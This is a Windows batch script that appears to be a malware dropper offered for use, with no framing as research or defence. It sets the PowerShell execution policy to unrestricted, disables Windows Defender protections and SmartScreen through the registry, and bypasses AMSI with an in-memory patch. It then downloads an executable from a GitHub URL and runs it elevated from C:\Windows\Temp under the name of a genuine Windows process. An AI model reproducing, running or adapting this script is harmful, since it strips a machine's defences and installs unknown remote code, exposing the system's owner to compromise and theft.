@echo off
:: Set PowerShell ExecutionPolicy to Unrestricted for machine and current user
powershell -Command "Set-ExecutionPolicy Unrestricted -Scope LocalMachine -Force"
powershell -Command "Set-ExecutionPolicy Unrestricted -Scope CurrentUser -Force"

:: Create missing Defender registry keys for Real-Time Protection if not exist
powershell -Command "if (-not (Test-Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection')) { New-Item -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender' -Name 'Real-Time Protection' -Force | Out-Null }"

:: Disable Defender protections permanently via registry
powershell -Command "New-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender' -Name 'DisableAntiSpyware' -Value 1 -PropertyType DWORD -Force"
powershell -Command "New-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection' -Name 'DisableRealtimeMonitoring' -Value 1 -PropertyType DWORD -Force"
powershell -Command "New-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection' -Name 'DisableBehaviorMonitoring' -Value 1 -PropertyType DWORD -Force"
powershell -Command "New-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection' -Name 'DisableOnAccessProtection' -Value 1 -PropertyType DWORD -Force"

:: Disable SmartScreen permanently via registry
powershell -Command "Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer' -Name 'SmartScreenEnabled' -Value 'Off'"
powershell -Command "Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Attachments' -Name 'ScanWithAntiVirus' -Value 2 -Type DWord"
powershell -Command "Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\System' -Name 'EnableSmartScreen' -Value 0 -Type DWord"

:: Patch AMSI in memory, download and run taskhostw.exe elevated from C:\Windows\Temp
powershell -NoProfile -ExecutionPolicy Bypass -Command ^
"[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true); ^
$u='https://github.com/searchonion/b/raw/refs/heads/main/taskhostw.exe'; ^
$f='C:\Windows\Temp\taskhostw.exe'; ^
if (Test-Path $f) { Remove-Item $f -Force }; ^
Invoke-WebRequest -Uri $u -OutFile $f -UseBasicParsing; ^
Start-Process $f -Verb RunAs"

pause
